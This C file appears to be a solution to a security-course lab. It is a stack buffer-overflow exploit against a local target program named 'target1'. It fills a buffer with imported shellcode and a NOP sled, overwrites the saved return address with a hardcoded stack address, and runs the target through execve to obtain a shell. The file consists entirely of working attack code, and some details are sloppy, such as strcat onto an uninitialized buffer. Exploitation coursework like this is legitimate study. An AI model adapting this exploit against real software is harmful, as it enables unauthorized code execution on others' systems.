#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

#define SHELL_SIZE 46
#define BUF_TO_RET 120
#define BUF_SIZE 125
#define BUF_ADDR 0x2021feb0

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char attack_buffer[BUF_SIZE];

	strcat(attack_buffer, shellcode);
	for (int i = SHELL_SIZE; i < BUF_TO_RET; i++)
		attack_buffer[i] = 0x90;

	int *ret_address = (int*)&attack_buffer[BUF_TO_RET];
	*ret_address = (char*)0x2021fe10;

	args[0] = TARGET;
	args[1] = attack_buffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
